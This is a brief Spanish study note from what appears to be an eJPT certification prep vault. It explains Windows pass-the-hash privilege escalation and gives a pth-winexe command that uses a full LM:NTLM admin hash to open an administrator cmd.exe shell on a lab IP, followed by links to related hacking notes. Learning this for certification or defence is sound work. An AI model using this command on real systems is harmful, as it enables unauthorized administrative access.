- ¿Por qué descifrar un hash de contraseña cuando puede autenticarse usando el hash?

- Utilice el hash de administración completo con pth-winexe para generar un shell que se ejecuta como administrador sin necesidad de descifrar su contraseña. Recuerde que el hash completo incluye tanto el LM como el NTLM hash, separado por un colon:

```
pth-winexe -U 'admin%hash' //10.10.94.6 cmd.exe`
```

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Herramientas]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Passwords - Registry]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Passwords - Saved Creds]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Passwords - Security Account Manager (SAM)]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Generate a Reverse Shell Executable]]